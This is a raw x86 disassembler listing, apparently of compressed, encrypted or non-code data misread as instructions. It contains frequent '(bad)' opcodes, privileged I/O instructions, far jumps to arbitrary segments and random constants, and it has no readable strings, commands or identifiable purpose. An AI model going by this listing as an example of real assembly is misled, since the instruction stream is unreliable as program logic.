  428b86:	add    ebp,DWORD PTR [esi-0x5f]
  428b89:	nop    DWORD PTR [edx-0xf]
  428b8d:	cmp    eax,0x4cb20
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xeda300e3
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [edx+0x71976cfd],bl
  428c11:	inc    ecx
  428c12:	lock and BYTE PTR [esp+edx*1],bh
  428c16:	mov    al,ds:0x215d0fdb
  428c1b:	daa    
  428c1c:	sbb    ebx,DWORD PTR [eax+ebp*2]
  428c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c20:	imul   esi,ecx,0xffffffdd
  428c23:	adc    al,0xe7
  428c25:	(bad)  
  428c26:	jb     0x428c4b
  428c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c29:	enter  0xb696,0xaa
  428c2d:	cmp    al,0x5b
  428c2f:	stos   DWORD PTR es:[edi],eax
  428c30:	hlt    
  428c31:	loop   0x428ca3
  428c33:	mov    ch,0xea
  428c35:	es jbe 0x428c97
  428c38:	shl    ah,cl
  428c3a:	xchg   edi,eax
  428c3b:	jl     0x428c1a
  428c3d:	jns    0x428c26
  428c3f:	sbb    BYTE PTR [esi+ecx*1-0x12],cl
  428c43:	out    0x90,al
  428c45:	mov    eax,ds:0x181c8255
  428c4a:	push   esp
  428c4b:	fld    QWORD PTR [ebx]
  428c4d:	add    edx,DWORD PTR [edi]
  428c4f:	ins    DWORD PTR es:[edi],dx
  428c50:	enter  0x841b,0x9c
  428c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c55:	das    
  428c56:	rcl    eax,1
  428c58:	cmp    bh,BYTE PTR [edi-0x5f54850b]
  428c5e:	popf   
  428c5f:	jne    0x428c22
  428c61:	addr16 jbe 0x428cb2
  428c64:	popa   
  428c65:	cmc    
  428c66:	mov    WORD PTR [esi+0x73],?
  428c69:	cld    
  428c6a:	add    DWORD PTR [ebx-0x46],edx
  428c6d:	mov    ds:0x4c16e2cb,eax
  428c72:	hlt    
  428c73:	mov    edx,0x7903dcb8
  428c78:	push   ecx
  428c79:	popf   
  428c7a:	inc    ebx
  428c7b:	test   eax,0xceffb957
  428c80:	pop    ecx
  428c81:	jns    0x428c6b
  428c83:	(bad)  
  428c84:	pusha  
  428c85:	push   ss
  428c86:	add    eax,0x9c509148
  428c8b:	sub    dl,BYTE PTR [edx]
  428c8d:	cmp    BYTE PTR [edi+0x7e],ah
  428c90:	adc    dl,BYTE PTR [edx+ebp*4]
  428c93:	cmp    cl,BYTE PTR [ecx]
  428c95:	push   0x733a5ba5
  428c9a:	mov    cl,0x10
  428c9c:	pop    ds
  428c9d:	push   ecx
  428c9e:	lods   eax,DWORD PTR ds:[esi]
  428c9f:	jbe    0x428c4d
  428ca1:	jmp    0xbba7:0xbfa4dcf4
  428ca8:	rcl    DWORD PTR [ecx-0x38],cl
  428cab:	lock les esi,FWORD PTR [eax+0x0]
  428caf:	fadd   QWORD PTR [esi-0x2506f46b]
  428cb5:	xchg   edx,eax
  428cb6:	shl    BYTE PTR [edx+0x43],1
  428cb9:	sahf   
  428cba:	xchg   esi,eax
  428cbb:	dec    edx
  428cbc:	popa   
  428cbd:	xchg   ebx,eax
  428cbe:	rol    BYTE PTR [ecx+ecx*8-0x5f],cl
  428cc2:	(bad)  [esi-0x3d]
  428cc5:	inc    eax
  428cc6:	pop    esp
  428cc7:	pop    ss
  428cc8:	repz adc edx,DWORD PTR [ecx+0x7a08fcd4]
  428ccf:	push   es
  428cd0:	sbb    dh,dl
  428cd2:	mov    bh,0xbe
  428cd4:	dec    esi
  428cd5:	adc    eax,0xd6d229bd
  428cda:	data16 aaa 
  428cdc:	xchg   DWORD PTR [esi-0x27],ebx
  428cdf:	loopne 0x428cb3
  428ce1:	push   ebx
  428ce2:	pushf  
  428ce3:	rcl    BYTE PTR [edi-0x42],1
  428ce6:	adc    al,0xf9
  428ce8:	push   edi
  428ce9:	inc    edx
  428cea:	pop    ebp
  428ceb:	pop    eax
  428cec:	cmp    eax,0x96543856
  428cf1:	fwait
  428cf2:	aas    
  428cf3:	outs   dx,DWORD PTR ds:[esi]
  428cf4:	or     eax,0xe961954e
  428cf9:	cli    
  428cfa:	repnz and eax,0xcec16afb
  428d00:	add    eax,0xd138154d
  428d05:	daa    
  428d06:	test   ah,bh
  428d08:	je     0x428d43
  428d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d0b:	pop    esi
  428d0c:	(bad)  
  428d0e:	mov    eax,0xd7f1
	...
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x34ec
  428d82:	aaa    
  428d83:	pop    ds
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0xb5000001,al
  428d8d:	sub    al,0x7a
  428d8f:	xchg   BYTE PTR [eax-0x9adb5f0],al
  428d95:	cdq    
  428d96:	ins    BYTE PTR es:[edi],dx
  428d97:	adc    BYTE PTR [edi+esi*4-0x325530a1],bh
  428d9e:	dec    eax
  428d9f:	jo     0x428d5d
  428da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428da2:	fidivr DWORD PTR [edx-0x70df6c44]
  428da8:	outs   dx,DWORD PTR ds:[esi]
  428da9:	sbb    al,0xcb
  428dab:	pop    edi
  428dac:	xor    edi,ebp
  428dae:	jnp    0x428d5b
  428db0:	push   ds
  428db1:	mov    bh,0x28
  428db3:	and    eax,0x22b99fb0
  428db8:	cmp    eax,DWORD PTR [ebx]
  428dba:	cmp    BYTE PTR [edi+ecx*8],al
  428dbd:	jl     0x428e3a
  428dbf:	mov    DWORD PTR [eax+0x765cea6a],eax
  428dc5:	shl    edi,1
  428dc7:	cs pop ss
  428dc9:	cmp    ah,ah
  428dcb:	pop    ebx
  428dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428dcd:	fisub  WORD PTR [ebp+0x697d7924]
  428dd3:	pop    ebx
  428dd4:	(bad)  
  428dd5:	or     edx,DWORD PTR [edx]
  428dd7:	jle    0x428d96
  428dd9:	sbb    edi,DWORD PTR [eax-0x69]
  428ddc:	push   0xb9829f45
  428de1:	xor    eax,0xdf44aa6f
  428de6:	lea    eax,[ebx]
  428de8:	push   ss
  428de9:	mov    edx,0x8329134e
  428dee:	iret   
  428def:	pop    esi
  428df0:	or     BYTE PTR [esi+edx*1+0x67],al
  428df4:	aaa    
  428df5:	cmp    ebp,DWORD PTR [ebx-0x1f856b6a]
  428dfb:	fwait
  428dfc:	jnp    0x428d87
  428dfe:	adc    dh,bl
  428e00:	add    DWORD PTR [edi],edx
  428e02:	cmp    eax,0x28803ed
  428e07:	cmc    
  428e08:	xor    al,0x3d
  428e0a:	mov    esp,0x9e05675d
  428e0f:	pop    edi
  428e10:	add    edx,edx
  428e12:	std    
  428e13:	retf   0x7cc1
  428e16:	ret    0xafc3
  428e19:	scas   eax,DWORD PTR es:[edi]
  428e1a:	inc    esp
  428e1b:	jnp    0x428e1f
  428e1d:	sbb    ah,BYTE PTR [esp+ebx*8]
  428e20:	les    ebp,FWORD PTR [ecx+0x55]
  428e23:	mov    ebx,0x273929f3
  428e28:	mov    edx,0x441ff7a7
  428e2d:	test   eax,0x4cdeeeb5
  428e32:	in     al,0x5e
  428e34:	sub    DWORD PTR ds:0xe730557b,ebx
  428e3a:	push   cs
  428e3b:	lds    ecx,FWORD PTR [ebx+0x47751c93]
  428e41:	push   ebx
  428e42:	adc    ebp,DWORD PTR [esi+eax*2+0x42]
  428e46:	pop    DWORD PTR [edi+0x5]
  428e49:	sub    cl,bh
  428e4b:	fs mov edx,eax
  428e4e:	mov    edi,ebp
  428e50:	fcomp  DWORD PTR [edx-0x23775c76]
  428e56:	push   cs
  428e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e58:	cdq    
  428e59:	fwait
  428e5a:	aas    
  428e5b:	add    al,0xc3
  428e5d:	js     0x428e4b
  428e5f:	(bad)  
  428e60:	push   ds
  428e61:	dec    edi
  428e62:	hlt    
  428e63:	xchg   esi,eax
  428e64:	and    edx,DWORD PTR [ebx-0x65]
  428e67:	lods   al,BYTE PTR ds:[esi]
  428e68:	sbb    DWORD PTR [ecx+0x183d9305],esi
  428e6e:	pushf  
  428e6f:	mov    ebx,0x8e69e374
  428e74:	jecxz  0x428ecb
  428e76:	jnp    0x428e12
  428e78:	sub    al,0x7f
  428e7a:	pop    esi
  428e7b:	adc    BYTE PTR [ebx-0x6a],0xfa
  428e7f:	(bad)  
  428e81:	stos   BYTE PTR es:[edi],al
  428e82:	sahf   
  428e83:	xchg   esp,eax
  428e84:	call   0xfded:0x2033bd8a
  428e8b:	lahf   
  428e8c:	add    DWORD PTR [edi],edx
  428e8e:	leave  
  428e8f:	(bad)  
  428e90:	pop    ebx
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xdb
  428f01:	lds    ecx,FWORD PTR [ebx+0x1b63c5d]
  428f07:	add    BYTE PTR ds:0xd4000001,al
  428f0d:	rol    bl,cl
  428f0f:	mov    edi,DWORD PTR [ebp-0x40]
  428f12:	jnp    0x428eb2
  428f14:	sti    
  428f15:	adc    dl,BYTE PTR [edx]
  428f17:	or     BYTE PTR [esi-0x2e1bcf5d],0x51
  428f1e:	push   ss
  428f1f:	mov    cl,0xac
  428f21:	push   edx
  428f22:	icebp  
  428f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f24:	adc    eax,0xd9bb8960
  428f29:	xor    ch,bl
  428f2b:	xchg   DWORD PTR [ebx-0x1b738276],eax
  428f31:	jno    0x428f34
  428f33:	je     0x428f19
  428f35:	sub    ah,dl
  428f37:	retf   0x730d
  428f3a:	dec    ebx
  428f3b:	loop   0x428f6f
  428f3d:	and    DWORD PTR [ebx],ebx
  428f3f:	mov    ebp,0x366b58ae
  428f45:	mul    DWORD PTR [esi]
  428f47:	xchg   ecx,eax
  428f48:	jmp    0x428eea
  428f4a:	hlt    
  428f4b:	cmp    bl,ch
  428f4d:	mov    eax,ds:0x2b92d9b
  428f52:	outs   dx,BYTE PTR ds:[esi]
  428f53:	test   al,0x42
  428f55:	push   0x62
  428f57:	jp     0x428edb
  428f59:	dec    edi
  428f5a:	jge    0x428fb4
  428f5c:	dec    eax
  428f5d:	or     ebp,DWORD PTR [edi-0xbd6b9bf]
  428f63:	jae    0x428f67
  428f65:	arpl   sp,ax
  428f67:	sti    
  428f68:	push   eax
  428f69:	std    
  428f6a:	and    ch,BYTE PTR [edi+ecx*2+0x7f]
  428f6e:	inc    edx
  428f6f:	sbb    al,0x51
  428f71:	in     al,dx
  428f72:	(bad)  
  428f73:	loopne 0x428f89
  428f75:	mov    bh,0xb7
  428f78:	sub    al,0x5a
  428f7a:	or     edx,DWORD PTR [esp+edx*2-0x1e453ee0]
  428f81:	xor    BYTE PTR [ebp-0x367b53a7],0x6
  428f88:	dec    ebx
  428f89:	mov    ss,WORD PTR [ecx-0x7affb4a8]
  428f8f:	int3   
  428f90:	xchg   edx,eax
  428f91:	scas   al,BYTE PTR es:[edi]
  428f92:	hlt    
  428f93:	aad    0x7c
  428f95:	popa   
  428f96:	out    dx,eax
  428f97:	push   esi
  428f98:	pop    ebp
  428f99:	xlat   BYTE PTR ds:[ebx]
  428f9a:	in     al,dx
  428f9b:	lods   al,BYTE PTR ds:[esi]
  428f9c:	push   cs
  428f9d:	dec    eax
  428f9e:	xchg   ebp,eax
  428f9f:	arpl   WORD PTR [ebx-0x39],bp
  428fa2:	jecxz  0x428f69
  428fa4:	dec    esp
  428fa5:	sahf   
  428fa6:	mov    ah,BYTE PTR [edx-0x3c710cc0]
  428fac:	dec    ebp
  428fad:	add    edi,DWORD PTR [esi]
  428faf:	inc    esp
  428fb0:	les    esp,FWORD PTR [edi]
  428fb2:	add    DWORD PTR [esi+0x7c487cd8],0x88546093
  428fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fbd:	adc    al,0xa8
  428fbf:	adc    eax,0xaa86596c
  428fc4:	and    eax,0xe6550933
  428fc9:	dec    eax
  428fca:	data16 jmp 0x429038
  428fcd:	mov    al,0x35
  428fcf:	or     BYTE PTR [esi-0x53e54f46],bh
  428fd5:	out    0x8c,al
  428fd7:	cmc    
  428fd8:	es rol esi,1
  428fdb:	xchg   DWORD PTR [eax],ebx
  428fdd:	xor    DWORD PTR [ebp+0x79],0x38
  428fe1:	ds jl  0x429045
  428fe4:	cmp    DWORD PTR [edi+edi*8-0x47],ebx
  428fe8:	scas   al,BYTE PTR es:[edi]
  428fe9:	sub    eax,0xb863141e
  428fee:	push   ebp
  428fef:	mov    cl,0xb6
  428ff1:	inc    edx
  428ff2:	or     eax,0x2c78dd1d
  428ff7:	xchg   esi,eax
  428ff8:	add    eax,0xaab660bd
  428ffd:	out    dx,eax
  428ffe:	les    eax,FWORD PTR ds:0x5ea2eacd
  429004:	and    dh,BYTE PTR [ecx+0x3ad39217]
  42900a:	aad    0x56
  42900c:	icebp  
  42900d:	sti    
  42900e:	mov    esp,DWORD PTR [edx]
  429010:	scas   al,BYTE PTR es:[edi]
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x6dfc7b77
  429081:	fnstenv [edi]
  429083:	mov    al,0x41
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0x30000001,al
  42908d:	inc    edx
  42908e:	(bad)  
  42908f:	das    
  429090:	xor    al,0x7b
  429092:	out    0x74,al
  429094:	rol    DWORD PTR [ebp+edx*1-0x37],0x23
  429099:	xchg   edx,eax
  42909a:	cdq    
  42909b:	(bad)
  42909e:	popf   
  42909f:	push   ecx
  4290a0:	pushf  
  4290a1:	push   ebx
  4290a2:	jl     0x4290c2
  4290a4:	arpl   WORD PTR [eax+0x7e],dx
  4290a7:	cmp    eax,0x7028bd9b
  4290ac:	xchg   ecx,eax
  4290ad:	cmp    ch,dh
  4290af:	cmp    DWORD PTR [eax+0x2b0c82ee],ebp
  4290b5:	dec    ebx
  4290b6:	les    ebp,FWORD PTR [ecx+0x373faf3c]
  4290bc:	xor    DWORD PTR [ebx-0x7b],ebp
  4290bf:	sbb    al,0x13
  4290c1:	dec    BYTE PTR [ecx+0x2d6ebb75]
  4290c7:	or     eax,0x25bc2300
  4290cc:	repz out dx,eax
  4290ce:	mov    eax,0xf448ad02
  4290d3:	data16 test al,0x26
  4290d6:	push   ecx
  4290d7:	lock inc esi
  4290d9:	jb     0x4290ae
  4290db:	xchg   BYTE PTR [eax],dl
  4290dd:	and    BYTE PTR [ebp-0x116f6f0a],0xa6
  4290e4:	or     eax,0x462dfd05
  4290e9:	ret    
  4290ea:	mov    eax,0x95b80d13
  4290ef:	sbb    BYTE PTR [edi-0x59cf4416],bh
  4290f5:	outs   dx,DWORD PTR ds:[esi]
  4290f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290f7:	jns    0x429106
  4290f9:	jg     0x429125
  4290fb:	adc    bh,dl
  4290fd:	sbb    eax,esi
  4290ff:	scas   al,BYTE PTR es:[edi]
  429100:	rcl    BYTE PTR [ebp+0x5d],cl
  429103:	ret    0x9a6f
  429106:	inc    eax
  429107:	in     eax,0x26
  429109:	adc    al,0x74
  42910b:	mov    al,ds:0x9c1cb83c
  429110:	jmp    0xfee4b1cb
  429115:	mov    ecx,0x43ee031b
  42911a:	retf   
  42911b:	and    eax,0x6de28349
  429120:	rcl    edx,0x6c
  429123:	cmp    BYTE PTR [ebp+ebp*1-0x605779d8],ah
  42912a:	not    DWORD PTR [ebx+0x77f812d9]
  429130:	adc    DWORD PTR [ebx+0x11ab7d1b],eax
  429136:	repnz inc ebp
  429138:	jnp    0x4291b2
  42913a:	mov    eax,0x9316a80c
  42913f:	icebp  
  429140:	js     0x4290fd
  429142:	pop    ds
  429143:	out    0x43,al
  429145:	xchg   edx,eax
  429146:	mov    edx,0xfac9cc96
  42914b:	pusha  
  42914c:	push   es
  42914d:	test   BYTE PTR [esi-0x9774d52],dh
  429153:	mov    eax,edi
  429155:	xor    eax,0x74998a18
  42915a:	sbb    esp,eax
  42915c:	fistp  WORD PTR [esi+0x4d9583bf]
  429162:	adc    DWORD PTR ds:0x85421b17,esi
  429168:	xchg   ebp,eax
  429169:	or     esi,ebx
  42916b:	sbb    cl,dl
  42916d:	test   eax,0x3473d4e0
  429172:	dec    eax
  429173:	xchg   esi,eax
  429174:	sti    
  429175:	sub    BYTE PTR [ebx],ah
  429177:	inc    ecx
  429178:	in     eax,dx
  429179:	xor    DWORD PTR [esi-0x7b5f3e9e],edx
  42917f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429180:	fcomp  QWORD PTR [eax]
  429182:	iret   
  429183:	loop   0x429174
  429185:	xchg   DWORD PTR [edx],esp
  429187:	adc    dh,BYTE PTR [ebx]
  429189:	(bad)  
  42918a:	sub    eax,0xeae3542d
  42918f:	loop   0x4291be
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [esi+ebx*8+0x466479c3],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    bl,bh
  42920d:	and    BYTE PTR [eax+0x5ad1fcf4],cl
  429213:	lock leave 
  429215:	addr16 lock pop ss
  429218:	outs   dx,DWORD PTR ds:[esi]
  429219:	xor    ecx,0x2036b39a
  42921f:	mov    cl,BYTE PTR [ecx]
  429221:	pushf  
  429222:	ret    0x9506
  429225:	std    
  429226:	add    ah,ch
  429228:	jnp    0x42922a
  42922a:	enter  0xa313,0x2
  42922e:	adc    al,0xf2
  429230:	inc    ecx
  429231:	xchg   edi,eax
  429232:	cmp    DWORD PTR ds:0xabeeecaf,0x71a8c2a8
  42923c:	ins    BYTE PTR es:[edi],dx
  42923d:	aad    0x78
  42923f:	enter  0x7642,0x71
  429243:	fwait
  429244:	stos   DWORD PTR es:[edi],eax
  429245:	enter  0x40e4,0xe8
  429249:	repz or DWORD PTR [eax+0x2eb1039e],0xdc487389
  429254:	out    dx,eax
  429255:	js     0x42920d
  429257:	cmp    DWORD PTR [ecx-0x6b],ebp
  42925a:	push   edx
  42925b:	lods   al,BYTE PTR ds:[esi]
  42925c:	xchg   esi,eax
  42925d:	shl    BYTE PTR [ebp+0x2026f7e5],0x1a
  429264:	addr16 mov edi,0xaea326da
  42926a:	jg     0x4292a3
  42926c:	cmp    bl,BYTE PTR ds:0xf9857500
  429272:	imul   edx,DWORD PTR [ebx],0xba9f0a47
  429278:	adc    BYTE PTR [esi+ecx*1],al
  42927b:	sub    DWORD PTR [edx+0x58],0xb0b250f2
  429282:	cmp    ch,dh
  429284:	sbb    BYTE PTR [esi-0x5f],0x8b
  429288:	clc    
  429289:	shr    BYTE PTR [esi+0x1622f473],0xc3
  429290:	gs test esp,0xe9927bb9
  429297:	xor    eax,0x30ec8589
  42929c:	cli    
  42929d:	cmp    eax,0x95753221
  4292a2:	cmp    BYTE PTR [edx+0x6178c731],0x1f
  4292a9:	pusha  
  4292aa:	cmp    eax,0xa64fa173
  4292af:	(bad)  
  4292b0:	in     al,0x2e
  4292b2:	jnp    0x429317
  4292b4:	pop    ss
  4292b5:	(bad)  
  4292b6:	pop    ebx
  4292b7:	ss push ds
  4292b9:	daa    
  4292ba:	iret   
  4292bb:	mov    dh,0x13
  4292bd:	enter  0x2cb1,0xd2
  4292c1:	pminsw mm7,QWORD PTR [eax]
  4292c4:	sbb    eax,0xdd04e882
  4292c9:	inc    ebx
  4292ca:	dec    ebp
  4292cb:	loope  0x4292ba
  4292cd:	lahf   
  4292ce:	dec    ebp
  4292cf:	mov    bl,0xb9
  4292d1:	mov    esi,0xbd335feb
  4292d6:	cld    
  4292d7:	ins    BYTE PTR es:[edi],dx
  4292d8:	arpl   WORD PTR [eax],si
  4292da:	imul   ebp,DWORD PTR [ebp+0x198f197a],0xffffff8d
  4292e1:	dec    edi
  4292e2:	pop    edx
  4292e3:	(bad)  
  4292e4:	lock dec ebp
  4292e6:	mov    eax,ds:0x569898f
  4292eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292ec:	cmp    eax,0x6905fce6
  4292f1:	and    BYTE PTR [ebx-0x76],0x5c
  4292f5:	(bad)  
  4292f7:	test   al,0x4c
  4292f9:	mov    ?,WORD PTR [esp+edi*1-0x505800ee]
  429300:	push   edi
  429301:	push   ecx
  429302:	mov    dl,0xb4
  429304:	and    eax,0xa5ac5425
  429309:	pushf  
  42930a:	test   DWORD PTR [eax-0x4073eae0],esi
  429310:	sub    DWORD PTR [eax],eax
	...
  429372:	add    BYTE PTR [eax],al
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xd6
  429381:	cld    
  429382:	stos   DWORD PTR es:[edi],eax
  429383:	daa    
  429384:	dec    ebx
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	iret   
  42938d:	cli    
  42938e:	in     al,0x8b
  429390:	repnz dec ebp
  429392:	sub    eax,0xbb44565d
  429397:	test   BYTE PTR [ebp+0x48006ff3],cl
  42939d:	pop    edi
  42939e:	mov    BYTE PTR cs:[edx-0x27],al
  4293a2:	dec    edi
  4293a3:	(bad)  
  4293a4:	es sub cl,cl
  4293a7:	(bad)  
  4293a8:	pusha  
  4293a9:	mov    bl,BYTE PTR [ebp-0x499bb0df]
  4293af:	push   ebx
  4293b0:	push   0x5154b928
  4293b5:	mov    al,ds:0x82f7e2c6
  4293ba:	dec    ecx
  4293bb:	push   0x8e3d29d3
  4293c0:	jne    0x429438
  4293c2:	sub    ebp,eax
  4293c4:	dec    ebp
  4293c5:	mov    ah,0x30
  4293c7:	out    dx,eax
  4293c8:	pop    ds
  4293c9:	pop    edi
  4293ca:	add    al,0x92
  4293cc:	cs mov ebp,0xb458b37
  4293d2:	lahf   
  4293d3:	push   edi
  4293d4:	mov    ah,0x91
  4293d6:	test   BYTE PTR [ebx+0x1e],bh
  4293d9:	adc    DWORD PTR [edx+0x21],0xaf1866b6
  4293e0:	inc    esp
  4293e1:	inc    ebp
  4293e2:	sbb    eax,0xe46fc999
  4293e7:	cmp    DWORD PTR [ebx+edi*4+0x4527d2b4],ecx
  4293ee:	pop    ebp
  4293ef:	push   esi
  4293f0:	xchg   edx,eax
  4293f1:	sub    BYTE PTR [edx],cl
  4293f3:	fwait
  4293f4:	fwait
  4293f5:	pop    eax
  4293f6:	sub    al,0xcb
  4293f8:	mov    dl,0xa2
  4293fa:	xchg   ebp,ebp
  4293fc:	sub    edx,edx
  4293fe:	call   0x5fd2e594
  429403:	jmp    0x9465:0x42a7cd6a
  42940a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42940b:	xlat   BYTE PTR ds:[ebx]
  42940c:	(bad)  
  42940d:	stc    
  42940e:	xchg   ebp,eax
  42940f:	pop    eax
  429410:	iret   
  429411:	repz inc ebp
  429413:	(bad)  
  429414:	(bad)  
  429418:	in     eax,dx
  429419:	xchg   BYTE PTR [ebp-0x39],bh
  42941c:	mov    ds:0x85ebe47,al
  429421:	and    esp,ecx
  429423:	xor    BYTE PTR [ebx],ch
  429425:	cmp    BYTE PTR [ecx+0x7068fc08],ah
  42942b:	push   edx
  42942c:	lds    ecx,FWORD PTR [edx-0xf1bcaa3]
  429432:	mov    esi,0xfeed0326
  429437:	push   ss
  429438:	xchg   ebp,eax
  429439:	xchg   ebx,eax
  42943a:	rcl    DWORD PTR [eax+0x4b636a95],0x17
  429441:	dec    esp
  429442:	shl    BYTE PTR [eax-0x3ab810f7],cl
  429448:	inc    ebx
  429449:	fld    QWORD PTR [esi]
  42944b:	ja     0x4293df
  42944d:	mov    ebp,0x70be3052
  429452:	pop    ebp
  429453:	fadd   QWORD PTR [ecx]
  429455:	adc    al,0x93
  429457:	inc    esp
  429458:	add    cl,BYTE PTR [edi+0x5522390c]
  42945e:	in     eax,0x10
  429460:	(bad)  
  429461:	div    BYTE PTR [esi-0x11e1dabe]
  429467:	xor    ebx,DWORD PTR [esi]
  429469:	jmp    0xafa448d6
  42946e:	add    ah,BYTE PTR [edx+esi*1]
  429471:	mov    edx,0x58d161a7
  429476:	and    eax,0xad294ad6
  42947b:	lods   al,BYTE PTR ds:[esi]
  42947c:	push   0x6f0f3466
  429481:	fldln2 
  429483:	push   ds
  429484:	inc    ecx
  429485:	sbb    dh,BYTE PTR [ebx]
  429487:	shl    BYTE PTR [edi],0x5
  42948a:	xchg   BYTE PTR [edi-0x4e],bh
  42948d:	inc    eax
  42948e:	push   cs
  42948f:	push   esi
  429490:	pop    es
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x9bc5b16],dx
  429503:	cwde   
  429504:	push   eax
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	scas   eax,DWORD PTR es:[edi]
  42950d:	ins    DWORD PTR es:[edi],dx
  42950e:	out    dx,eax
  42950f:	(bad)  
  429511:	mul    DWORD PTR [eax]
  429513:	mov    ch,BYTE PTR [ecx]
  429515:	sti    
  429516:	cwde   
  429517:	mov    edi,0xbe65b8d
  42951c:	icebp  
  42951d:	loope  0x429598
  42951f:	mov    BYTE PTR [ecx+ebx*1-0x327225b8],ah
  429526:	and    dh,BYTE PTR [esi+esi*1]
  429529:	call   0xb6f2:0x4e6b5707
  429530:	repz sub cl,BYTE PTR [edx]
  429533:	fwait
  429534:	test   edx,ebx
  429536:	int    0x6d
  429538:	jecxz  0x429555
  42953a:	mov    bh,BYTE PTR gs:[ebp-0x78]
  42953e:	repnz push edx
  429540:	sbb    DWORD PTR ds:0x99e48838,edi
  429546:	xchg   esp,eax
  429547:	or     edi,DWORD PTR [ebx]
  429549:	in     al,0x29
  42954b:	(bad)  
  42954c:	sar    ebx,0x33
  42954f:	dec    esp
  429550:	mov    ch,0xdc
  429552:	dec    esp
  429553:	out    dx,al
  429554:	sar    DWORD PTR [edi+0x59],1
  429557:	push   esi
  429558:	mov    ebp,0x546796ac
  42955d:	cld    
  42955e:	stos   BYTE PTR es:[edi],al
  42955f:	mov    edi,0x8542e0d8
  429564:	mov    edx,0x6d246551
  429569:	inc    esp
  42956a:	dec    esp
  42956b:	(bad)  
  42956c:	sbb    eax,0x7f0b9ad4
  429571:	aaa    
  429572:	dec    edi
  429573:	cwde   
  429574:	pop    ss
  429575:	fstp   st(4)
  429577:	jecxz  0x429589
  429579:	in     eax,dx
  42957a:	mov    fs,esp
  42957c:	leave  
  42957d:	push   edx
  42957e:	pop    esp
  42957f:	(bad)  
  429580:	xchg   edx,eax
  429581:	mov    dl,0x8f
  429583:	sti    
  429584:	ja     0x429603
  429586:	adc    dh,BYTE PTR [eax+0x3a]
  429589:	out    0xfb,eax
  42958b:	xor    DWORD PTR ds:0x5bf83a88,0x4f
  429592:	or     bl,bh
  429594:	repz inc esp
  429596:	ret    
  429597:	mov    ds:0x92401d62,al
  42959c:	jno    0x4295f0
  42959e:	in     al,dx
  42959f:	mov    eax,0xab964eec
  4295a4:	adc    eax,0xd1f805fb
  4295a9:	pop    edi
  4295aa:	jecxz  0x429586
  4295ac:	stc    
  4295ad:	mov    ch,0xe5
  4295af:	jl     0x42961e
  4295b1:	sar    BYTE PTR [esi],cl
  4295b3:	test   al,0xa5
  4295b5:	sbb    edx,DWORD PTR [edi+eiz*4]
  4295b8:	pop    ds
  4295b9:	push   ebp
  4295ba:	scas   al,BYTE PTR es:[edi]
  4295bb:	ds add eax,0xb8afcd19
  4295c1:	aas    
  4295c2:	pop    esi
  4295c3:	je     0x429548
  4295c5:	push   es
  4295c6:	adc    BYTE PTR [edx+0x25],ah
  4295c9:	pusha  
  4295ca:	push   ecx
  4295cb:	shl    cl,cl
  4295cd:	fdivr  DWORD PTR [esi+0x66]
  4295d0:	push   es
  4295d1:	mov    BYTE PTR [esp+edi*2-0x11c18eb3],dl
  4295d8:	es iret 
  4295da:	fadd   DWORD PTR [eax+ecx*8-0x45033628]
  4295e1:	push   ds
  4295e2:	or     DWORD PTR [edx],edx
  4295e4:	sbb    al,0x65
  4295e6:	(bad)  
  4295e8:	jle    0x429614
  4295ea:	lods   eax,DWORD PTR ds:[esi]
  4295eb:	sete   bh
  4295ee:	sahf   
  4295ef:	in     al,0x19
  4295f1:	xchg   ebx,ebp
  4295f3:	cld    
  4295f4:	or     al,bh
  4295f6:	push   0xffffffa7
  4295f8:	fild   WORD PTR [ebx+0x5]
  4295fb:	adc    al,0xe7
  4295fd:	lods   eax,DWORD PTR ds:[esi]
